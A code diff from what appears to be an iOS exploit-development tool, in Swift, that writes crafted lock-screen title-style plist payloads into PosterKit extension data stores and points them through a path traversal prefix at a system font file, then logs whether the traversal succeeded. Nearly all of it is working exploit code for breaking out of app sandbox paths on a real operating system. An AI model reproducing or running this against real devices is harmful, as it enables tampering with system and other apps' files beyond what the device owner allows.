@@ -3819,10 +3819,6 @@ class SymHandler {
         let payload13sys = payloadTitleStyleCustomFont13
         diag.append("payload13sys (HelveticaNeue system font): \(payload13sys.count)b")
 
-        // Reset to primary payload for writing
-        _PP13CustomFontConfigProxy.fontPostScriptName = "pp-probe-13"
-        _PP13CustomFontConfigProxy.extensionBundleRelativeFilePath = pbFontPath
-
         let extBase = container + "/Library/Application Support/PRBPosterExtensionDataStore/61/Extensions"
         guard let extBaseH = try? BadQuery.consume(path: extBase, create: true) else {
             diag.append("extBase NOACCESS"); return pbSave(diag)
@@ -3861,9 +3857,9 @@ class SymHandler {
                             let dirLabel = contentSubdir.isEmpty ? "vDir" : "contents"
                             let titlePath = "\(base)/com.apple.posterkit.provider.instance.titleStyleConfiguration.plist"
                             if let fH = try? BadQuery.consume(path: titlePath, create: true) { fH.release() }
-                            let ok = fm.createFile(atPath: titlePath, contents: payload13, attributes: nil)
-                                || ((try? payload13.write(to: URL(fileURLWithPath: titlePath))) != nil)
-                            diag.append("\(extName.prefix(18))/\(subdir.prefix(6))/v\(ver)/\(dirLabel)/titleStyle: \(ok ? "WRITTEN" : "FAIL")")
+                            let ok = fm.createFile(atPath: titlePath, contents: payload13sys, attributes: nil)
+                                || ((try? payload13sys.write(to: URL(fileURLWithPath: titlePath))) != nil)
+                            diag.append("\(extName.prefix(18))/\(subdir.prefix(6))/v\(ver)/\(dirLabel)/titleStyle[sys]: \(ok ? "WRITTEN" : "FAIL")")
                             if ok { totalWritten += 1 }
                         }
                     }
@@ -3872,8 +3868,8 @@ class SymHandler {
         }
 
         diag.append("\ntotal written: \(totalWritten)")
-        diag.append("After injecting: lock screen → if clock shows different font → path traversal SUCCESS")
-        diag.append("Check posterboardd crash log for CoreText errors referencing pp_probe_font13.otf")
+        diag.append("payload13sys path: \(traversalPrefix + "System/Library/Fonts/HelveticaNeue.ttc")")
+        diag.append("After injecting: lock screen → if clock shows different font → PATH TRAVERSAL CONFIRMED")
         return pbSave(diag)
     }
 }
